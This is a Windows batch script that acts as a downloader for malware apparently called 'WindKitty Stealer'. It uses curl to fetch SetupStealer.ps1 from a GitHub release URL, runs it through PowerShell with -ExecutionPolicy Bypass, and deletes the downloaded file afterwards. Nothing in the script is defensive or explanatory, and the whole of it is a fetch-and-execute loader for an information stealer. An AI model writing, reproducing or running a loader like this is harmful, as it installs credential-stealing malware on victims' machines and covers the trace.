@echo off

curl -L -o SetupStealer.ps1 https://github.com/WindKitty/WindKitty-Stealer/releases/download/windkittycompiler/SetupStealer.ps1
powershell.exe -ExecutionPolicy Bypass -File .\SetupStealer.ps1 
del SetupStealer.ps1

pause
